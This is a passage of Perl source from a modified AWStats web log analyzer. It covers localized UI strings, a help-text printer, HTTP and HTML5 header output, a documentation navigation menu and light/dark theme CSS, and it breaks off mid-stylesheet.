	'Unresolved IP Address',
	'Unknown OS (Referer field)',
	'Required but not found URLs (HTTP code 404)',
	'IP Address',
	'Error&nbsp;Hits',
	'Unknown browsers (Referer field)',
	'different robots',
	'visits/visitor',
	'Robots/Spiders visitors',
	'Free realtime logfile analyzer for advanced web statistics',
	'of',
	'Pages',
	'Hits',
	'Versions',
	'Operating Systems',
	'Jan',
	'Feb',
	'Mar',
	'Apr',
	'May',
	'Jun',
	'Jul',
	'Aug',
	'Sep',
	'Oct',
	'Nov',
	'Dec',
	'Navigation',
	'File type',
	'Update now',
	'Bandwidth',
	'Back to main page',
	'Top',
	'dd mmm yyyy - HH:MM',
	'Filter',
	'Full list',
	'Hosts',
	'Known',
	'Robots',
	'Sun',
	'Mon',
	'Tue',
	'Wed',
	'Thu',
	'Fri',
	'Sat',
	'Days of week',
	'Who',
	'When',
	'Authenticated users',
	'Min',
	'Average',
	'Max',
	'Web compression',
	'Bandwidth saved',
	'Compression on',
	'Compression result',
	'Total',
	'different keyphrases',
	'Entry',
	'Code',
	'Average size',
	'Links from a NewsGroup',
	'KB',
	'MB',
	'GB',
	'Grabber',
	'Yes',
	'No',
	'Info.',
	'OK',
	'Exit',
	'Visits duration',
	'Close window',
	'Bytes',
	'Search&nbsp;Keyphrases',
	'Search&nbsp;Keywords',
	'different refering search engines',
	'different refering sites',
	'Other phrases',
	'Other logins (and/or anonymous users)',
	'Refering search engines',
	'Refering sites',
	'Summary',
	'Exact value not available in "Year" view',
	'Data value arrays',
	'Sender EMail',
	'Receiver EMail',
	'Reported period',
	'Extra/Marketing',
	'Screen sizes',
	'Worm/Virus attacks',
	'Hit on favorite icon',
	'Days of month',
	'Miscellaneous',
	'Browsers with Java support',
	'Browsers with Macromedia Director Support',
	'Browsers with Flash Support',
	'Browsers with Real audio playing support',
	'Browsers with Quictime audio playing support',
	'Browsers with Windows Media audio playing support',
	'Browsers with PDF support',
	'SMTP Error codes',
	'Countries',
	'Mails',
	'Size',
	'First',
	'Last',
	'Exclude filter',
'Codes shown here gave hits or traffic "not viewed" by visitors, so they are not included in other charts.',
	'Cluster',
'Robots shown here gave hits or traffic "not viewed" by visitors, so they are not included in other charts.',
	'Numbers after + are successful hits on "robots.txt" files',
'Worms shown here gave hits or traffic "not viewed" by visitors, so thay are not included in other charts.',
'Not viewed traffic includes traffic generated by robots, worms, or replies with special HTTP status codes.',
	'Traffic viewed',
	'Traffic not viewed',
	'Monthly history',
	'Worms',
	'different worms',
	'Mails successfully sent',
	'Mails failed/refused',
	'Sensitive targets',
	'Javascript disabled',
	'Created by',
	'plugins',
	'Regions',
	'Cities',
	'Opera versions',
	'Safari versions',
	'Chrome versions',
	'Konqueror versions',
	',',
 	'Downloads',
 	'Export CSV',
	'TB',
	'Frequency[/s]',
	'Number of requests',
	'Period',
	's',
	'Request average frequency [/s]',
	'Request size',
	'Request time'
);
#------------------------------------------------------------------------------
# footer-docs
#------------------------------------------------------------------------------
sub detect_terminal_language {
    # 从环境变量获取
    my $lang = $ENV{'LANG'} || $ENV{'LANGUAGE'} || $ENV{'LC_ALL'} || $ENV{'LC_MESSAGES'} || '';
    
    # 如果没有设置，返回 undef
    return undef if !$lang;
    
    # 去掉编码部分 (zh_CN.UTF-8 -> zh_CN)
    $lang =~ s/\..*$//;
    
    # 转换格式 (zh_CN -> zh-cn)
    $lang =~ s/_/-/g;
    $lang = lc($lang);
    
    # 检查是否支持该语言
    my @supported = qw(ar az bg bn bs ca cs da de el en es fa fi fr hr hu id it ja ka ku ko nl no pl pt pt-br ro ru sk sq sr sv th tr uk ur vi zh-cn zh-tw);
    foreach (@supported) {
        if ($_ eq $lang) {
            return $lang;
        }
    }
    
    # 如果完整语言不支持，尝试主要语言 (zh-cn -> zh)
    my $primary = (split /-/, $lang)[0];
    foreach (@supported) {
        if ($_ eq $primary) {
            return $primary;
        }
    }
    
    return undef;
}
#==============================================================================
# 显示帮助信息 - 现代重构版本
#==============================================================================
sub print_help {
    # 检测终端语言
    if (!$Lang) {
        my $term_lang = detect_terminal_language();
        $Lang = $term_lang || 'en';
        &Read_Language_Data($Lang);
    }
    
    binmode(STDOUT, ':utf8');
    Read_Ref_Data('domains', 'robots', 'worms', 'operating_systems', 'browsers', 'search_engines');
    # 获取翻译文本
    my $title = sprintf(_t("AWStats %s - Advanced Web Statistics"), $VERSION);
    my $copyright1 = _t("Copyright (c) 2000-2026 Laurent Destailleur");
    my $copyright2 = _t("Copyright (c) 2025 HestiaCP Enhanced Edition");
    my $warranty = _t("AWStats comes with ABSOLUTELY NO WARRANTY. It's a free software distributed with a GNU General Public License (See LICENSE file for details).");
    
    my $syntax = sprintf(_t("Syntax: %s -config=virtualhostname [options]"), $PROG);
    
    my $desc1 = sprintf(_t("This runs %s in command line to update statistics (-update option) of a web site, from the log file defined in AWStats config file, or build a HTML report (-output option)."), $PROG);
    my $desc2 = sprintf(_t("First, %s tries to read %s.virtualhostname.conf as the config file. If not found, %s tries to read %s.conf, and finally the full path passed to -config="), $PROG, $PROG, $PROG, $PROG);
    
    my $note1 = _t("Note 1: Config files (*.conf) must be in /etc/awstats, /usr/local/etc/awstats, /etc or same directory than awstats.pl script file.");
    my $note2 = _t("Note 2: If AWSTATS_FORCE_CONFIG environment variable is defined, AWStats will use it as the 'config' value, whatever is the value on command line or URL.");
    my $note3 = _t("See AWStats documentation for all setup instructions.");
    
    my $update_title = _t("Options to update statistics:");
    my $update_update = _t("  -update        to update statistics (default)");
    my $update_steps = sprintf(_t("  -showsteps     to add benchmark information every %s lines processed"), $NBOFLINESFORBENCHMARK);
    my $update_corrupted = _t("  -showcorrupted to add output for each corrupted lines found, with reason");
    my $update_dropped = _t("  -showdropped   to add output for each dropped lines found, with reason");
    my $update_unknown = _t("  -showunknownorigin  to output referer when it can't be parsed");
    my $update_direct = _t("  -showdirectorigin   to output log line when origin is a direct access");
    my $update_for = _t("  -updatefor=n   to stop the update process after parsing n lines");
    my $update_logfile = _t("  -LogFile=x     to change log to analyze whatever is 'LogFile' in config file");
    my $update_warn = _t("  Be care to process log files in chronological order when updating statistics.");
    
    my $output_title = _t("Options to show statistics:");
    my $output_main = _t("  -output      to output main HTML report (no update made except with -update)");
    my $output_x = _t("  -output=x    to output other report pages where x is:");
    
    my $output_options = [
        ["alldomains", _t("build page of all domains/countries")],
        ["allhosts", _t("build page of all hosts")],
        ["lasthosts", _t("build page of last hits for hosts")],
        ["unknownip", _t("build page of all unresolved IP")],
        ["allemails", _t("build page of all email senders (maillog)")],
        ["lastemails", _t("build page of last email senders (maillog)")],
        ["allemailr", _t("build page of all email receivers (maillog)")],
        ["lastemailr", _t("build page of last email receivers (maillog)")],
        ["alllogins", _t("build page of all logins used")],
        ["lastlogins", _t("build page of last hits for logins")],
        ["allrobots", _t("build page of all robots/spider visits")],
        ["lastrobots", _t("build page of last hits for robots")],
        ["urldetail", _t("list most often viewed pages")],
        ["urldetail:filter", _t("list most often viewed pages matching filter")],
        ["urlentry", _t("list entry pages")],
        ["urlentry:filter", _t("list entry pages matching filter")],
        ["urlexit", _t("list exit pages")],
        ["urlexit:filter", _t("list exit pages matching filter")],
        ["osdetail", _t("build page with os detailed versions")],
        ["browserdetail", _t("build page with browsers detailed versions")],
        ["unknownbrowser", _t("list 'User Agents' with unknown browser")],
        ["unknownos", _t("list 'User Agents' with unknown OS")],
        ["refererse", _t("build page of all refering search engines")],
        ["refererpages", _t("build page of all refering pages")],
        ["keyphrases", _t("list all keyphrases used on search engines")],
        ["keywords", _t("list all keywords used on search engines")],
        ["errors404", _t("list 'Referers' for 404 errors")],
        ["allextraX", _t("build page of all values for ExtraSection X")],
    ];
    
    my $staticlinks = _t("  -staticlinks           to have static links in HTML report page");
    my $staticlinksext = _t("  -staticlinksext=xxx    to have static links with .xxx extension instead of .html");
    my $lang_opt = _t("  -lang=LL     to output a HTML report in language LL (en,de,es,fr,it,nl,zh-cn,...)");
    my $month_opt = _t("  -month=MM    to output a HTML report for an old month MM");
    my $year_opt = _t("  -year=YYYY   to output a HTML report for an old year YYYY");
    my $date_note = _t("  The 'date' options doesn't allow you to process old log file. They only allow you to see a past report for a chosen month/year period instead of current month/year.");
    
    my $other_title = _t("Other options:");
    my $debug_opt = _t("  -debug=X     to add debug informations lesser than level X (speed reduced)");
    my $version_opt = _t("  -version     show AWStats version");
    
    my $supports_title = _t("Now supports/detects:");
    
    my @features = (
        _t("  Web/Ftp/Mail/streaming server log analyzis (and load balanced log files)"),
        _t("  Reverse DNS lookup (IPv4 and IPv6) and GeoIP lookup"),
        _t("  Number of visits, number of unique visitors"),
        _t("  Visits duration and list of last visits"),
        _t("  Authenticated users"),
        _t("  Days of week and rush hours"),
        _t("  Hosts list and unresolved IP addresses list"),
        _t("  Most viewed, entry and exit pages"),
        _t("  Files type and Web compression (mod_gzip, mod_deflate stats)"),
        _t("  Screen size"),
        _t("  Ratio of Browsers with support of: Java, Flash, RealG2 reader, Quicktime reader, WMA reader, PDF reader"),
        _t("  Configurable personalized reports"),
        sprintf(_t("  %s domains/countries"), scalar keys %DomainsHashIDLib),
        sprintf(_t("  %s robots"), scalar keys %RobotsHashIDLib),
        sprintf(_t("  %s worm's families"), scalar keys %WormsHashLib),
        sprintf(_t("  %s operating systems"), scalar keys %OSHashLib),
    );
    
    # 获取浏览器统计
    my $browser_count = scalar keys %BrowsersHashIDLib;
    &Read_Ref_Data('browsers_phone');
    my $browser_total = scalar keys %BrowsersHashIDLib;
    my $browser_text = sprintf(_t("  %s browsers (%s with phone browsers database)"), $browser_count, $browser_total);
    
    my $se_text = sprintf(_t("  %s search engines (and keyphrases/keywords used from them)"), scalar keys %SearchEnginesHashLib);
    
    my @more_features = (
        _t("  All HTTP errors with last referrer"),
        _t("  Report by day/month/year"),
        _t("  Dynamic or static HTML or XHTML reports, static PDF reports"),
        _t("  Indexed text or XML monthly database"),
        _t("  And a lot of other advanced features and options..."),
    );
    
    my $footer = _t("New versions and FAQ at http://www.awstats.org");
    
    # 输出帮助信息
    print "\n";
    print "═══════════════════════════════════════════════════════════════════════════\n";
    print "  $title\n";
    print "  $copyright1\n";
    print "  $copyright2\n";
    print "═══════════════════════════════════════════════════════════════════════════\n";
    print "\n";
    print "  $warranty\n";
    print "\n";
    print "  $syntax\n";
    print "\n";
    print "  $desc1\n";
    print "  $desc2\n";
    print "\n";
    print "  $note1\n";
    print "  $note2\n";
    print "  $note3\n";
    print "\n";
    
    print "───────────────────────────────────────────────────────────────────────────\n";
    print "  $update_title\n";
    print "───────────────────────────────────────────────────────────────────────────\n";
    print "  $update_update\n";
    print "  $update_steps\n";
    print "  $update_corrupted\n";
    print "  $update_dropped\n";
    print "  $update_unknown\n";
    print "  $update_direct\n";
    print "  $update_for\n";
    print "  $update_logfile\n";
    print "  $update_warn\n";
    print "\n";
    
    print "───────────────────────────────────────────────────────────────────────────\n";
    print "  $output_title\n";
    print "───────────────────────────────────────────────────────────────────────────\n";
    print "  $output_main\n";
    print "  $output_x\n";
    
    foreach my $opt (@$output_options) {
        printf "    %-20s %s\n", $opt->[0], $opt->[1];
    }
    
    print "\n";
    print "  $staticlinks\n";
    print "  $staticlinksext\n";
    print "  $lang_opt\n";
    print "  $month_opt\n";
    print "  $year_opt\n";
    print "  $date_note\n";
    print "\n";
    
    print "───────────────────────────────────────────────────────────────────────────\n";
    print "  $other_title\n";
    print "───────────────────────────────────────────────────────────────────────────\n";
    print "  $debug_opt\n";
    print "  $version_opt\n";
    print "\n";
    
    print "───────────────────────────────────────────────────────────────────────────\n";
    print "  $supports_title\n";
    print "───────────────────────────────────────────────────────────────────────────\n";
    
    foreach my $feature (@features) {
        print "  $feature\n";
    }
    print "  $browser_text\n";
    print "  $se_text\n";
    
    foreach my $feature (@more_features) {
        print "  $feature\n";
    }
    print "\n";
    
    print "───────────────────────────────────────────────────────────────────────────\n";
    print "  $footer\n";
    print "───────────────────────────────────────────────────────────────────────────\n";
    print "\n";
}
#------------------------------------------------------------------------------
# Functions
#------------------------------------------------------------------------------

# Function to solve pb with openvms
sub file_filt (@) {
	my @retval;
	foreach my $fl (@_) {
		$fl =~ tr/^//d;
		push @retval, $fl;
	}
	return sort @retval;
}

#------------------------------------------------------------------------------
# Function:     Send HTTP headers (modern version)
# Parameters:   None
# Input:        $HeaderHTTPSent, $PageCode
# Output:       $HeaderHTTPSent=1
# Return:       None
#------------------------------------------------------------------------------
sub http_head {
    return if $HeaderHTTPSent;
        # 始终使用 UTF-8，强制现代浏览器标准
        print "Content-type: text/html; charset=utf-8\n";
        
        # 添加安全响应头
        print "X-Content-Type-Options: nosniff\n";
        print "X-Frame-Options: SAMEORIGIN\n";
        print "Referrer-Policy: no-referrer-when-downgrade\n";
        
        # 缓存控制
        if ( $Expires =~ /^\d+$/ ) {
            print "Cache-Control: public, max-age=$Expires\n";
            print "Last-Modified: " . gmtime($starttime) . "\n";
            print "Expires: " . ( gmtime( $starttime + $Expires ) ) . "\n";
        } else {
            print "Cache-Control: no-cache, must-revalidate\n";
        }
        print "\n";
    $HeaderHTTPSent++;
}


#------------------------------------------------------------------------------
# Function:     Get translated text
# Parameters:   Message ID or string
# Return:       Translated text
#------------------------------------------------------------------------------
sub _t {
    my $msgid = shift;
    
    # 如果是数字索引，从 $Message 数组获取
    if ( $msgid =~ /^\d+$/ && defined $Message[$msgid] ) {
        return $Message[$msgid];
    }
    
    # 从翻译映射表获取（如果存在）
    if ( defined $translate_map{$msgid} ) {
        return $translate_map{$msgid};
    }
    
    # 返回原文本
    return $msgid;
}

#------------------------------------------------------------------------------
# Function:     Write HTML5 header with RTL/LTR support and theme toggle
# Parameters:   None
# Input:        %HTMLOutput, $PluginMode, $Lang, $StyleSheet, $PageDir, etc.
# Output:       $HeaderHTMLSent=1
# Return:       None
#------------------------------------------------------------------------------
sub html_head {
        return if $NOHTML;
    return unless ( scalar keys %HTMLOutput || $PluginMode );

    my $dir = $PageDir ? 'rtl' : 'ltr';
        my $periodtitle = " ($YearRequired";
        $periodtitle .= ( $MonthRequired ne 'all' ? "-$MonthRequired" : "" );
        $periodtitle .= ( $DayRequired   ne ''    ? "-$DayRequired"   : "" );
        $periodtitle .= ( $HourRequired  ne ''    ? "-$HourRequired"  : "" );
        $periodtitle .= ")";

        # HTML5 文档类型
        print "<!DOCTYPE html>\n";
        print "<html lang=\"" . _t($Lang) . "\" dir=\"$dir\">\n";
        print "<head>\n";
        
        # 元数据 - 现代标准
        print "<meta charset=\"utf-8\">\n";
        print "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n";
        print "<meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n";
        
        # 生成器标签
        print "<meta name=\"generator\" content=\"AWStats $VERSION\">\n";
        
        # 机器人控制
        if ($MetaRobot) {
            my $index = ($FrameName eq 'mainleft') ? 'noindex' : 'index';
            my $follow = ($FrameName eq 'mainleft' || $FrameName eq 'index') ? 'follow' : 'nofollow';
            print "<meta name=\"robots\" content=\"$index, $follow\">\n";
        } else {
            print "<meta name=\"robots\" content=\"noindex, nofollow\">\n";
        }
        
        # 过期时间
            print "<meta http-equiv=\"expires\" content=\"" . gmtime( $starttime + $Expires ) . "\">\n" if $Expires;
        
        # 页面描述
        my @k = keys %HTMLOutput;
        my $description = sprintf("%s - %s %s%s%s", 
            ucfirst($PROG),
            _t("Advanced Web Statistics for"),
            $SiteDomain,
            $periodtitle,
            ($k[0] ? " - " . _t($k[0]) : "")
        );
        print "<meta name=\"description\" content=\"" . $description . "\">\n";
        
        # 关键词（可选）
        if ( $MetaRobot && $FrameName ne 'mainleft' ) {
            print "<meta name=\"keywords\" content=\"$SiteDomain, web statistics, log analyzer, traffic analysis\">\n";
        }
        
        # 页面标题
        my $title = sprintf("%s %s%s", 
            _t("Statistics for"),
            $SiteDomain,
            ($k[0] ? " - " . _t($k[0]) : "")
        );
        print "<title>$title</title>\n";
        
        # 样式表
        if ( $FrameName ne 'index' ) {
            if ($StyleSheet) {
                print "<link rel=\"stylesheet\" href=\"$StyleSheet\">\n";
            } else {
                # 内置现代 CSS
                print get_modern_css($dir);
            }
            
            # 获取翻译文本
            my $light_mode_text = _t("Switch to light mode");
            my $dark_mode_text = _t("Switch to dark mode");
        }
        
        # 插件钩子
        foreach my $pluginname ( keys %{ $PluginsLoaded{'AddHTMLHeader'} } ) {
            my $function = "AddHTMLHeader_$pluginname";
            &$function();
        }
        
        print "</head>\n";
        
        # Body 开始
        if ( $FrameName ne 'index' ) {
            my $body_class = ($FrameName eq 'mainleft') ? 'class="aws-sidebar"' : 'class="aws-main"';
            print "<body $body_class>\n";
            print "<div class=\"aws-container\">\n";
            my $light_mode_text = _t("Switch to light mode");
			my $dark_mode_text = _t("Switch to dark mode");
			my $title = _t("AWStats Log Viewer");
			my $nav_home = "AWStats";  # 品牌名通常不翻译
			
			# 导航分类
			my $nav_category_basic = _t("nav_category_basic");
			my $nav_category_guide = _t("nav_category_guide");
			my $nav_category_reference = _t("nav_category_reference");
			my $nav_category_integration = _t("nav_category_integration");
			my $nav_category_dev = _t("nav_category_dev");
			
			# 基础文档
			my $nav_changelog = _t("nav_changelog");
			my $nav_what = _t("nav_what");
			my $nav_license = _t("nav_license");
			my $nav_glossary = _t("nav_glossary");
			
			# 使用指南
			my $nav_setup = _t("nav_setup");
			my $nav_upgrade = _t("nav_upgrade");
			my $nav_config = _t("nav_config");
			my $nav_extra = _t("nav_extra");
			my $nav_tools = _t("nav_tools");
			
			# 参考资源
			my $nav_faq = _t("nav_faq");
			my $nav_security = _t("nav_security");
			my $nav_compare = _t("nav_compare");
			my $nav_benchmark = _t("nav_benchmark");
			
			# 集成与扩展
			my $nav_webmin = _t("nav_webmin");
			my $nav_dolibarr = _t("nav_dolibarr");
			my $nav_contrib = _t("nav_contrib");
			
			# 开发者文档
			my $nav_plugins = _t("nav_plugins");
			my $nav_hooks = _t("nav_hooks");
			my $nav_graphs = _t("nav_graphs");
            # 添加主题切换按钮（放在页面顶部）
print <<"END_BUTTON";
<div class="header-right">
    <div class="dropdown-menu" id="mobileMenu">
        <div class="dropdown-item">
            <div class="dropdown-title">📌 $nav_category_basic</div>
            <div class="dropdown-content">
                <a href="/vstats/docs/awstats_changelog.html" target="doc-frame">$nav_changelog</a>
                <a href="/vstats/docs/awstats_what.html" target="doc-frame">$nav_what</a>
                <a href="/vstats/docs/awstats_license.html" target="doc-frame">$nav_license</a>
                <a href="/vstats/docs/awstats_glossary.html" target="doc-frame">$nav_glossary</a>
            </div>
        </div>
        <div class="dropdown-item">
            <div class="dropdown-title">📘 $nav_category_guide</div>
            <div class="dropdown-content">
                <a href="/vstats/docs/awstats_setup.html" target="doc-frame">$nav_setup</a>
                <a href="/vstats/docs/awstats_upgrade.html" target="doc-frame">$nav_upgrade</a>
                <a href="/vstats/docs/awstats_config.html" target="doc-frame">$nav_config</a>
                <a href="/vstats/docs/awstats_extra.html" target="doc-frame">$nav_extra</a>
                <a href="/vstats/docs/awstats_tools.html" target="doc-frame">$nav_tools</a>
            </div>
        </div>
        <div class="dropdown-item">
            <div class="dropdown-title">📚 $nav_category_reference</div>
            <div class="dropdown-content">
                <a href="/vstats/docs/awstats_faq.html" target="doc-frame">$nav_faq</a>
                <a href="/vstats/docs/awstats_security.html" target="doc-frame">$nav_security</a>
                <a href="/vstats/docs/awstats_compare.html" target="doc-frame">$nav_compare</a>
                <a href="/vstats/docs/awstats_benchmark.html" target="doc-frame">$nav_benchmark</a>
            </div>
        </div>
        <div class="dropdown-item">
            <div class="dropdown-title">🧩 $nav_category_integration</div>
            <div class="dropdown-content">
                <a href="/vstats/docs/awstats_webmin.html" target="doc-frame">$nav_webmin</a>
                <a href="/vstats/docs/awstats_dolibarr.html" target="doc-frame">$nav_dolibarr</a>
                <a href="/vstats/docs/awstats_contrib.html" target="doc-frame">$nav_contrib</a>
            </div>
        </div>
        <div class="dropdown-item">
            <div class="dropdown-title">💻 $nav_category_dev</div>
            <div class="dropdown-content">
                <a href="/vstats/docs/awstats_dev_plugins.html" target="doc-frame">$nav_plugins</a>
                <a href="/vstats/docs/awstats_dev_plugins_hooks.html" target="doc-frame">$nav_hooks</a>
                <a href="/vstats/docs/awstats_dev_plugins_graphs.html" target="doc-frame">$nav_graphs</a>
            </div>
        </div>
    </div>
    <button id="theme-toggle" 
            class="theme-toggle" 
            onclick="toggleTheme()" 
            data-light-mode="$light_mode_text"
            data-dark-mode="$dark_mode_text"
            aria-label="$dark_mode_text">
        🌙
    </button>
</div>
END_BUTTON
        }
	print '<div id="doc-frame-bar" style="display:none; position:sticky; top:60px; z-index:999; background:var(--header-bg); padding:8px 20px; border-bottom:1px solid var(--border-color); margin-top:20px;">';
	print '<div style="display:flex; justify-content:flex-end; align-items:center;">';
	print '<span style="flex:1; font-weight:500;">' . _t("Documentation Viewer") . '</span>';
	print '<button id="doc-frame-close" style="background:none; border:none; cursor:pointer; font-size:16px; color:var(--text-color);" title="' . _t("Close") . '">✖</button>';
	print '</div>';
	print '</div>';
	print '<div id="doc-frame-container" style="display:none;">';
	print '<iframe name="doc-frame" id="doc-frame" style="width:100%; height:600px; border:1px solid var(--border-color); border-radius:0 0 8px 8px;" title="' . _t("Documentation Viewer") . '"></iframe>';
	print '</div>';
    $HeaderHTMLSent++;
}

#------------------------------------------------------------------------------
# Function:     Get modern CSS styles with theme support
# Parameters:   $dir (ltr/rtl)
# Return:       CSS string
#------------------------------------------------------------------------------
sub get_modern_css {
    my $dir = shift;
    
    return <<'END_CSS';
<style>
:root {
    --primary-color: #2563eb;
    --secondary-color: #1e40af;
    --text-color: #1f2937;
    --bg-color: #ffffff;
    --border-color: #e5e7eb;
    --hover-color: #dbeafe;
    --header-bg: #f1f5f9;
    --card-bg: #ffffff;
    --alt-row-bg: #f9fafb;
    --shadow: 0 1px 3px rgba(0,0,0,0.1);
    --link-color: #2563eb;
    --link-hover: #1e40af;
    --error-color: #dc2626;
    --warning-color: #d97706;
    --success-color: #059669;
    
    --color-day-bg: #ECECEC;
    --color-visits-bg: #F4F090;
    --color-pages-bg: #4477DD;
    --color-hits-bg: #66EEFF;
    --color-bandwidth-bg: #2EA495;
    --color-weekend-bg: #EAEAEA;
    --color-table-border: #ECECEC;
    --color-text-default: #000000;
    --color-titletext: #000000;
    --color-link: #0011BB;
    --color-hover: #605040;
    --color-table-bg: #CCCCDD;
    --color-table-title: #000000;
    --surface-secondary: #f1f5f9;
    --header-bg-rgb: 241, 245, 249;
}
[data-theme="dark"] {
    --primary-color: #60a5fa;
    --secondary-color: #3b82f6;
    --text-color: #f3f4f6;
    --bg-color: #1f2937;
    --border-color: #374151;
    --hover-color: #2d3748;
    --header-bg: #1e293b;
    --card-bg: #2d3748;
    --alt-row-bg: #374151;
    --shadow: 0 1px 3px rgba(0,0,0,0.3);
    --link-color: #60a5fa;
    --link-hover: #93c5fd;
    --error-color: #f87171;
    --warning-color: #fbbf24;
    --success-color: #34d399;
    --surface-secondary: #334155;
    --header-bg-rgb: 30, 41, 59; 

    --color-day-bg: #2d3748;
    --color-visits-bg: #8B5F1C;
    --color-pages-bg: #1E3A8A;
    --color-hits-bg: #0B5E6B;
    --color-bandwidth-bg: #0F5E52;
    --color-weekend-bg: #374151;
    --color-table-border: #374151;
    --color-text-default: #f3f4f6;
    --color-titletext: #f3f4f6;
    --color-link: #60a5fa;
    --color-hover: #93c5fd;
    --color-table-bg: #1e293b;
    --color-table-title: #f3f4f6;
}

#doc-frame-bar {
    backdrop-filter: blur(8px);
    box-shadow: 0 2px 4px rgba(0,0,0,0.1);
}
#doc-frame-container iframe {
    border-top: none;
}

body {
    font-family: var(--font-family);
    font-size: 14px;
    line-height: 1.5;
    color: var(--text-color);
    background-color: var(--bg-color);
    margin: 0;
    padding: 20px;
}

* {
    transition: background-color 0.3s ease, border-color 0.3s ease, color 0.2s ease;
}

.aws-container {
    max-width: 1400px;
    margin: 0 auto;
}

.aws-sidebar {
    background: var(--header-bg);
    padding: 15px;
    border-right: 1px solid var(--border-color);
}

.aws-main {
    background: var(--bg-color);
}

.aws-border {
    background-color: var(--header-bg);
    border-radius: 8px;
    padding: 10px;
    margin-bottom: 20px;
}

.aws-title {
    font-size: 18px;
    font-weight: 600;
    color: var(--primary-color);
    text-align: center;
    margin-bottom: 10px;
    padding: 10px;
    background: var(--header-bg);
    border-radius: 6px;
}

.aws-data {
    width: 100%;
    overflow-x: visible;
    margin-bottom: 20px;
}
td.aws:has(img) {
    text-align: left;
}

td.aws:has(img) img {
    display: block;
    float: left;
    clear: left;
    margin: 1px 0;
}
.aws-chart {
    width: 100%;
    margin-bottom: 20px;
}

.aws-whitespace {
    background: var(--header-bg);
}

table {
    border-collapse: collapse;
    background-color: var(--card-bg);
    border: 1px solid var(--border-color);
    border-radius: 8px;
    width: 100%;
}

th {
    background-color: var(--header-bg);
    color: var(--text-color);
    font-weight: 600;
    padding: 8px;
    text-align: center;
    border-bottom: 1px solid var(--border-color);
}

td {
    padding: 6px 8px;
    text-align: center;
    border-bottom: 1px solid var(--border-color);
    color: var(--text-color);
}

td.aws {
    border-color: var(--border-color);
    border-left-width: 0px;
    border-right-width: 1px;
    border-top-width: 0px;
    border-bottom-width: 1px;
    font: 11px var(--font-family);
    text-align: left;
    color: var(--text-color);
    padding: 0px;
}

table tr:nth-child(even) {
    background-color: var(--card-bg);
}

table tr:nth-child(odd) {
    background-color: var(--alt-row-bg);
}

table tr:hover {
    background-color: var(--hover-color);
}

tr:last-child td {
    border-bottom: none;
}

.currentday {
    font-weight: 700;
    color: var(--primary-color);
}

.aws-data-table {
    width: 100%;
    border-collapse: collapse;
    background-color: var(--card-bg);
    border: 1px solid var(--border-color);
}

.aws-data-table th,
.aws-data-table td {
    padding: 8px;
    text-align: center;
    border: 1px solid var(--border-color);
    color: var(--text-color);
}

.aws-data-table th {
    background-color: var(--header-bg);
    font-weight: 600;
}

.aws-data-table.ip-table th:first-child,
.aws-data-table.ip-table td:first-child,
.aws-data-table.robot-table th:first-child,
.aws-data-table.robot-table td:first-child {
    width: 80px;
    min-width: 80px;
    max-width: 80px;
    word-break: break-word;
}

a, a:link, a:visited {
	text-decoration: none;
	color: var(--link-color);
	transition: color 0.2s ease;
}

a:hover {
	color: var(--accent);
}

a:visited {
    color: var(--link-color);
}

.aws-formfield {
    padding: 8px 12px;
    border: 1px solid var(--border-color);
    border-radius: 4px;
    font-size: 14px;
    background-color: var(--card-bg);
    color: var(--text-color);
}

.aws-button {
    background-color: var(--primary-color);
    color: white;
    border: none;
    padding: 8px 16px;
    border-radius: 4px;
    cursor: pointer;
    font-size: 14px;
    transition: background-color 0.2s;
}

.aws-button:hover {
    background-color: var(--secondary-color);
}

.theme-toggle-container {
    position: sticky;
    top: 10px;
    right: 10px;
    z-index: 1000;
    display: flex;
    justify-content: flex-end;
    padding: 10px;
}

.theme-toggle {
    background: var(--card-bg);
    border: 1px solid var(--border-color);
    border-radius: 30px;
    padding: 8px 16px;
    cursor: pointer;
    font-size: 18px;
    box-shadow: var(--shadow);
    transition: all 0.3s ease;
    color: var(--text-color);
}

.theme-toggle:hover {
    transform: scale(1.05);
    box-shadow: 0 4px 6px rgba(0,0,0,0.1);
}

.theme-toggle:focus {
    outline: 2px solid var(--primary-color);
    outline-offset: 2px;
}

.aws-footer {
    margin-top: 40px;
    padding: 20px;
    text-align: center;
    border-top: 1px solid var(--border-color);
    color: var(--text-color);
    font-size: 12px;
}

.aws-footer a {
    color: var(--primary-color);
}

.aws-footer-note {
    margin-top: 10px;
    font-size: 11px;
    opacity: 0.8;
}

.error-text {
    color: var(--error-color);
    font-weight: 600;
}

.warning-message {
    color: var(--warning-color);
    border-left: 4px solid var(--warning-color);
    background-color: var(--card-bg);
    padding: 12px 16px;
    margin: 10px 0;
    border-radius: 4px;
}

.info-text {
    color: var(--text-color);
    opacity: 0.9;
}

.success-text {
    color: var(--success-color);
}

.error-card {
    background: var(--card-bg);
    border: 1px solid #ef4444;
    border-radius: 8px;
    padding: 20px;
    margin: 20px 0;
    box-shadow: var(--shadow);
}

.help-card {
    background: var(--card-bg);
    border: 1px solid var(--border-color);
    border-radius: 8px;
    padding: 20px;
    margin: 20px 0;
}

.code-block {
    background: var(--header-bg);
    padding: 12px;
    border-radius: 4px;
    font-family: monospace;
    overflow-x: auto;
    border: 1px solid var(--border-color);
    color: var(--text-color);
    white-space: pre-wrap;
    word-wrap: break-word;
}

.aws-note {
    font-size: 12px;
    color: var(--text-color);
    opacity: 0.7;
    padding: 8px;
    background: var(--header-bg);
    border-radius: 4px;
    margin-top: 8px;
}

[dir="rtl"] .aws-sidebar {
    border-right: none;
    border-left: 1px solid var(--border-color);
}

[dir="rtl"] .theme-toggle-container {
    left: 10px;
    right: auto;
}

[dir="rtl"] th,
[dir="rtl"] td {
    text-align: right;
}

[dir="rtl"] td.number, 
[dir="rtl"] td.numeric {
    text-align: left;
}

@media (max-width: 768px) {
    body { padding: 10px; }
    th, td { padding: 4px 6px; font-size: 12px; }
    .aws-title { font-size: 16px; }
    .theme-toggle-container { top: 5px; right: 5px; }
    .theme-toggle { padding: 6px 12px; font-size: 16px; }
}

[data-theme="dark"] [bgcolor="#ECECEC"],
[data-theme="dark"] td[bgcolor="#ECECEC"],
[data-theme="dark"] th[bgcolor="#ECECEC"] {
    background-color: var(--color-day-bg) !important;
    color: var(--text-color) !important;
}

[data-theme="dark"] [bgcolor="#F4F090"],
[data-theme="dark"] td[bgcolor="#F4F090"],
[data-theme="dark"] th[bgcolor="#F4F090"] {
    background-color: var(--color-visits-bg) !important;
    color: var(--text-color) !important;
}

[data-theme="dark"] [bgcolor="#4477DD"],
[data-theme="dark"] td[bgcolor="#4477DD"],
